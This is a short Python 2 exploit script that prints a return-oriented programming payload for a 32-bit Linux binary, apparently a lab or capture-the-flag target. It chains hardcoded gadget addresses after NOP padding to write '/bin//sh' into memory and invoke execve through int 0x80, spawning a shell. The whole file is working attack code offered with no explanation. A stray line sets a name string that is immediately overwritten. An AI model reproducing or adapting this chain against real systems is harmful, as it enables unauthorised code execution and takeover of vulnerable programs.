#!/usr/bin/env python
from struct import pack
import sys

# Padding goes here
p = "Jamie Floyd\x00"
p = '\x90'*int(sys.argv[1])

p += pack('<I', 0x0806eb0a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0807d10d) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a89d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb0a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x0807d10d) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a89d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb0a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054390) # xor eax, eax ; ret
p += pack('<I', 0x0809a89d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080e4efd) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806eb0a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054390) # xor eax, eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x0807b5f6) # inc eax ; ret
p += pack('<I', 0x08049491) # int 0x80

print p
